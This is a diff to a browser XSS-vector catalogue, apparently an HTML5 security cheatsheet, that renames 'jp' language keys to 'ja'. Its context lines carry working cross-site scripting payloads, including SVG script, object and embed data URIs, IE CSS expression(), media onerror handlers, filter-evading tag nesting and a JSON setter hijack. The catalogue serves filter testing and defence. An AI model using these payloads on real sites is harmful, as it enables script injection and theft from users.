@@ -1031,7 +1031,7 @@ var items =
         'category'   : 'behavior', 
         'name'       : {
             'en' : 'VML frame with embedded VML object plus onmouseover',
-            'jp' : '',
+            'ja' : '',
             'ru' : 'VML фрейм с помещенным в него VML объектом плюс onmouseover',
             'de' : ''
         },
@@ -1045,14 +1045,14 @@ var items =
         },
         'description': {
             'en' : 'A VML frame object works by giving the VML frame a "src" attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.',
-            'jp' : '',
+            'ja' : '',
             'ru' : 'Объект VML фрейма ссылается в атрибуте "src" на другой VML объект, который реагирует на событие движения мышью. В режиме совместимости VML фрейм может непосредственно заключать в себе VML rect объект или обычный HTML.', 
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx'],
         'howtofix'   : {
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
-            'jp' : '',
+            'ja' : '',
             'ru' : 'Не разрешайте свойства поведений в разрешаемых пользователю стилях и разметке и не полагайтесь на черные списки опасных HTML тегов.',
             'de' : ''
         },            
@@ -1382,7 +1382,7 @@ var items =
         'category'   : 'css', 
         'name'       : {
             'en' : 'Opera and Firefox css-string breaking',
-            'jp' : '',
+            'ja' : '',
             'ru' : 'Разрыв css-строки в Opera и Firefox',
             'de' : ''
         },
@@ -1396,14 +1396,14 @@ var items =
         },
         'description': {
             'en' : 'Opera, Firefox and other browsers allow breaking out an css-string with newline symbols. A string cannot directly contain a newline in CSS2+.',
-            'jp' : '',
+            'ja' : '',
             'ru' : 'Оpera, Firefox, а также другие браузеры позволяют прервать css-строку с помощью символов новой строки. Строка не может непосредственно содержать символ новой строки согласно стандартам CSS уровня 2 и выше. Фильтры, которые не учитывают эту особенность, будут неправильно определять опасные свойства стилей.',
             'de' : ''
         },
         'urls'    : [],
         'howtofix'   : {
             'en' : '',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },            
@@ -1419,21 +1419,21 @@ var items =
         'category'   : 'css', 
         'name'       : {
             'en' : 'Alternative css-syntax in Internet Explorer',
-            'jp' : '',
+            'ja' : '',
             'ru' : 'Альтернативный css-синтаксис в Internet Explorer',
             'de' : ''
         },
         'data'       : '<div style="font-family:foo}x=expression(%js_write%);">XXX</div>',
         'description': {
             'en' : 'Internet Explorer allows to use right curly brace (}) as a group separator. A CSS declaration in quirks mode may consist of a property name, followed by a symbol of equality (=).',
-            'jp' : '',
+            'ja' : '',
             'ru' : 'Internet Explorer разрешает использовать правую фигурную скобку (}) в качестве группового разделителя. В режиме совместимости css-декларация также может содержать имя свойства, за которым следует знак равенства (=).',
             'de' : ''
         },
         'urls'    : [],
         'howtofix'   : {
             'en' : '',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },            
@@ -1448,14 +1448,14 @@ var items =
         'category'   : 'svg', 
         'name'       : {
             'en' : 'SVG file executing JavaScript via <SCRIPT> tag',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
         'description': {
             'en' : 'SVG files can force the user agent to execute JavaScript via plain <SCRIPT> tags inside any SVG element without user interaction',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1486,14 +1486,14 @@ var items =
         'category'   : 'html', 
         'name'       : {
             'en' : 'JavaScript execution via <SCRIPT> for and event attributes',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<SCRIPT FOR=document EVENT=onreadystatechange>%js_alert%</SCRIPT>',
         'description': {
             'en' : 'Opera and Internet Explorer allow using <SCRIPT> tags with "for" and "event" attributes to bind event data to specific html elements. The two shown attribute values cause script execution without user interaction.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1516,14 +1516,14 @@ var items =
         'category'   : 'html', 
         'name'       : {
             'en' : 'JavaScript execution via <OBJECT> DataURL attribute',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="%js_uri_alert%"></OBJECT>',
         'description': {
             'en' : 'Internet Explorer 9 and - in some situations - earlier versions support the use of JavaScript URIs for the "dataurl" attribute of a TDC Object. The JavaScript will be executed without user any interaction.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1545,14 +1545,14 @@ var items =
         'category'   : 'html', 
         'name'       : {
             'en' : 'JavaScript execution via <OBJECT> data',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<object data="data:text/html;base64,%js_base64_alert%">',
         'description': {
             'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <OBJECT> "data" attribute value - even if base64 dencoded.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1577,14 +1577,14 @@ var items =
         'category'   : 'html', 
         'name'       : {
             'en' : 'JavaScript execution via <EMBED> src',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<embed src="data:text/html;base64,%js_base64_alert%">',
         'description': {
             'en' : 'Almost all browsers supoorting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1608,7 +1608,7 @@ var items =
         'category'   : 'behavior', 
         'name'       : {
             'en' : 'Internet Explorer Scriptlets executing JavaScript',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1622,7 +1622,7 @@ var items =
         },        
         'description': {
             'en' : 'Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1644,7 +1644,7 @@ var items =
         'category'   : 'behavior', 
         'name'       : {
             'en' : 'Internet Explorer Data Islands executing JavaScript',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1658,7 +1658,7 @@ var items =
         },        
         'description': {
             'en' : 'Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1680,14 +1680,14 @@ var items =
         'category'   : 'json', 
         'name'       : {
             'en' : 'Self-hijacking JSON literals',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]',
         'description': {
             'en' : 'In case parts of a JSON literal are controlled by user input there\'s a risk to allow auto-harvesting values from later object members.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1717,14 +1717,14 @@ var items =
         'category'   : 'html5', 
         'name'       : {
             'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<video><source onerror="%js_uri_alert%">',
         'description': {
             'en' : 'Opera 10.5+ and Chrome allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1747,14 +1747,14 @@ var items =
         'category'   : 'html5', 
         'name'       : {
             'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<video onerror="%js_uri_alert%"><source>',
         'description': {
             'en' : 'Firefox 3.5+ allows error handlers in <VIDEO> tags when applied with a <SOURCE> tag. The same works for <AUDIO> tags',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1776,14 +1776,14 @@ var items =
         'category'   : 'html', 
         'name'       : {
             'en' : 'Tags nested in other tags to trick filters',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<b <script>%js_alert%</script>0',
         'description': {
             'en' : 'Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn\'t.',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1807,14 +1807,14 @@ var items =
         'category'   : 'e4x', 
         'name'       : {
             'en' : 'E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<b><script<b></b><alert(1)</script </b>',
         'description': {
             'en' : 'This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparison (<b/> < alert(1)).',
-            'jp' : '',
+            'ja' : '',
             'ru' : '',
             'de' : ''
         },
@@ -1836,14 +1836,14 @@ var items =
         'category'   : 'html', 
         'name'       : {
             'en' : 'XSS using Grove Accent letter when copying innerHTML',
-            'jp' : 'innerHTML\u3092\u30b3\u30d4\u30fc\u3059\u308b\u969b\u306e\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u3092\u4f7f\u3063\u305fXSS',
+            'ja' : 'innerHTML\u3092\u30b3\u30d4\u30fc\u3059\u308b\u969b\u306e\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u3092\u4f7f\u3063\u305fXSS',
             'ru' : '',
             'de' : ''
         },
         'data'       : '<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div> <script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML; </script>',
         'description': {
 			'en' : 'IE assumes Grove Accent letter (`) as quotation like as \", \'. and strip Quotation mark(") of attribute value if the value doesn\'t contain space when refering innerHTML.',
-            'jp' : 'IE\u306f\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u0028\u0060\u0029\u3092 \" \u3084 \' \u306e\u3088\u3046\u306b\u5f15\u7528\u7b26\u3068\u3057\u3066\u6271\u3046\u3002\u307e\u305f\u3001innerHTML\u3092\u53c2\u7167\u3057\u305f\u3068\u304d\u306b\u5c5e\u6027\u5024\u306b\u30b9\u30da\u30fc\u30b9\u304c\u306a\u3051\u308c\u3070\u5f15\u7528\u7b26\u0028\u0022\u0029\u304c\u524a\u9664\u3055\u308c\u308b\u3002',
+            'ja' : 'IE\u306f\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u0028\u0060\u0029\u3092 \" \u3084 \' \u306e\u3088\u3046\u306b\u5f15\u7528\u7b26\u3068\u3057\u3066\u6271\u3046\u3002\u307e\u305f\u3001innerHTML\u3092\u53c2\u7167\u3057\u305f\u3068\u304d\u306b\u5c5e\u6027\u5024\u306b\u30b9\u30da\u30fc\u30b9\u304c\u306a\u3051\u308c\u3070\u5f15\u7528\u7b26\u0028\u0022\u0029\u304c\u524a\u9664\u3055\u308c\u308b\u3002',
             'ru' : '',
             'de' : ''
         },
